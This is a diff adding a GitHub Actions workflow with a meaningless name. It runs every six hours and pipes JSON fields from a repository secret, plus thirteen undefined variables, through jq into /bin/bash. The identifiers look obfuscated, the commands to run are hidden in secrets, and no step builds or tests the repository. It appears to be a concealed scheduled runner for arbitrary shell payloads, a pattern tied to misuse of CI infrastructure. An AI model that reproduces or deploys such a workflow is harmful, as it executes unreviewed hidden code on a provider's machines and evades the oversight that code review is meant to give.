@@ -1,0 +1,30 @@
+name: caobaisiwudaosheng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caobaisiwudaosheng
+        env:
+          vhtjm2022: ${{ secrets.vhtjm2022 }}
+        run: |
+          echo $vhtjm2022 | jq -r .gg1 | /bin/bash
+          echo $onta4276 | jq -r .viyb1586 | /bin/bash
+          echo $v06 | jq -r .t585 | /bin/bash
+          echo $kbcr5 | jq -r .sgc647 | /bin/bash
+          echo $lesg1950 | jq -r .lxv66 | /bin/bash
+          echo $n04 | jq -r .kw33055 | /bin/bash
+          echo $h9649 | jq -r .nsbh06105 | /bin/bash
+          echo $zf9989 | jq -r .onhin78390 | /bin/bash
+          echo $fdh742 | jq -r .doggs99 | /bin/bash
+          echo $coa582 | jq -r .kpn7523 | /bin/bash
+          echo $cuhro1 | jq -r .gckcu347 | /bin/bash
+          echo $czqj10 | jq -r .qz48394 | /bin/bash
+          echo $t7 | jq -r .zh40 | /bin/bash
+          echo $cvqx3 | jq -r .xovx86 | /bin/bash
+
